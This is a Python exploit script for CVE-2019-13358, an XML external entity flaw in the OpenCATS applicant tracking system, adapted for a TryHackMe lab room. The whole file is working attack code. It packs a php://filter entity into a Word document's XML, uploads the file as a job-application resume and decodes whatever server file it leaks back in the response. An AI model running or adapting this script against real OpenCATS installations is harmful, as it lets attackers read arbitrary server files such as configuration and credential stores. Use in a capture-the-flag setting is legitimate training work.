#!/usr/bin/env python

# Simple implementation of of Reginald Dodds's CVE-2019-13358 exploit adapted for Try Hack Me's Empline room.
# Dodd's outline of the exploit is available at https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/
# Requires python3-lxml, python-docx

from docx import Document
import base64
import lxml.html
import os
import requests
import shutil
import tempfile

# CHANGEME - file to download from target
TARGET = ''

ENDPOINT='http://job.empline.thm/careers/index.php?m=careers&p=onApplyToJobOrder'
ENTITY_REF = 'exploit'
WORD_FILE_NAME = 'exploit.docx'
XML_CONTENT_PATH = '/word/document.xml'

def build_payload(file_path: str, entity_ref: str) -> str:
    return f"<!DOCTYPE {entity_ref} [<!ENTITY {entity_ref} SYSTEM 'php://filter/convert.base64-encode/resource={file_path}'>]>"

def create_word_template(text_content: str, filename: str) -> None:
    word_doc = Document()
    word_doc.add_paragraph(text_content)
    word_doc.save(filename)

def generate_xml_payload(xml_content: str, entity_ref: str, target_path: str) -> str:
    xml_content = xml_content.replace(entity_ref, f'&{entity_ref};')
    payload = build_payload(target_path, entity_ref)
    node_list = xml_content.split('\n')
    node_list.insert(1, payload)
    return ''.join(node_list)

def build_form_data(file):
    return {
        'ID': (None, 1),
        'applyToJobSubAction': (None, 'resumeLoad'),
        'resumeFile': ('exploit.docx', file)
    }

def main() -> None:

    # Create .docx that will contain the XML payload
    create_word_template(ENTITY_REF, WORD_FILE_NAME)

    # Create a temporary directory and unzip .docx file
    tmp_dir = tempfile.mkdtemp()
    shutil.unpack_archive(WORD_FILE_NAME, tmp_dir, 'zip')

    # Open original XML content of word doc
    with open(f'{tmp_dir}{XML_CONTENT_PATH}', 'r+') as f:
        
        # Read original XML
        original_xml = f.read()

        # Generate malicious XML from original XML
        malicious_xml = generate_xml_payload(original_xml, ENTITY_REF, TARGET)

        # Overwrite original XML with malicious XML
        f.seek(0)
        f.write(malicious_xml)
        f.truncate()

    # Make a new .zip archive containing malicious xml
    shutil.make_archive('temp', 'zip', tmp_dir)

    # Rename new .zip archive 
    os.rename('temp.zip', WORD_FILE_NAME)

    # Build form data required for POST request
    with open(WORD_FILE_NAME, 'rb') as f:
        resp = requests.post(ENDPOINT, files=build_form_data(f))

    # Parse POST response for base64 encoded target
    html = lxml.html.fromstring(resp.content.decode())
    response_b64 = html.get_element_by_id('resumeContents').text_content().strip()

    print(base64.b64decode(response_b64).decode() if len(response_b64) else f'[!!!] No result for {TARGET}.')
    print(f'[!!!] Original .docx extracted to {tmp_dir} - don\'t forget to clean up!')


if __name__ == '__main__':
    main()
